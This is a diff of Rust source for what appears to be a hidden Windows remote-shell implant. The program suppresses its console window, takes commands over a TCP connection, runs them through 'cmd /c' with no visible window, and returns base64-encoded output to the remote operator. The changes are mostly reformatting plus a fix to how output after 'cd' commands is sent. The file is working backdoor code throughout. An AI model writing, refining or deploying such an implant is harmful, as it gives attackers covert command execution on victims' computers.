@@ -1,16 +1,15 @@
 #![windows_subsystem = "windows"]
 
+use reqwest::Error;
 use std::{
     env,
     io::{BufRead, BufReader, Write},
     net::TcpStream,
+    os::windows::process::CommandExt,
     process::Command,
     thread,
     time::Duration,
-    os::windows::process::CommandExt
 };
-use reqwest::Error;
-
 
 #[cfg(target_os = "windows")]
 const SHELL: [&str; 2] = ["cmd", "/c"];
@@ -48,7 +47,11 @@ fn main() {
                             let cmd = String::from_utf8_lossy(&input[0..input.len() - 1]);
 
                             #[cfg(target_os = "windows")]
-                            let _ = match Command::new(SHELL[0]).args(&[SHELL[1], &cmd]).creation_flags(CREATE_NO_WINDOW).output() {
+                            let _ = match Command::new(SHELL[0])
+                                .args(&[SHELL[1], &cmd])
+                                .creation_flags(CREATE_NO_WINDOW)
+                                .output()
+                            {
                                 Ok(output) => {
                                     if cmd.starts_with("cd") {
                                         // Buggy support for directories with whitespaces, so use dir /x to get Windows short names
@@ -57,16 +60,18 @@ fn main() {
                                                 "The system cannot find the path specified.",
                                             ),
                                         );
+                                        let _ = stream.write_all(b"\n");
+                                    } else {
+                                        let _ = stream.write_all(
+                                            (base64::encode(output.stdout) + "\n").as_bytes(),
+                                        );
+                                        let _ = stream.write_all(
+                                            (base64::encode(output.stderr) + "\n").as_bytes(),
+                                        );
                                     }
-                                    let _ = stream.write_all(
-                                        (base64::encode(output.stdout) + "\n").as_bytes(),
-                                    );
-                                    stream.write_all(
-                                        (base64::encode(output.stderr) + "\n").as_bytes(),
-                                    )
                                 }
                                 Err(error) => {
-                                    stream.write_all((error.to_string() + "\n").as_bytes())
+                                    let _ = stream.write_all((error.to_string() + "\n").as_bytes());
                                 }
                             };
 
@@ -92,7 +97,6 @@ fn main() {
                                     stream.write_all((error.to_string() + "\n").as_bytes())
                                 }
                             };
-
                         }
                     }
                     Err(_) => {
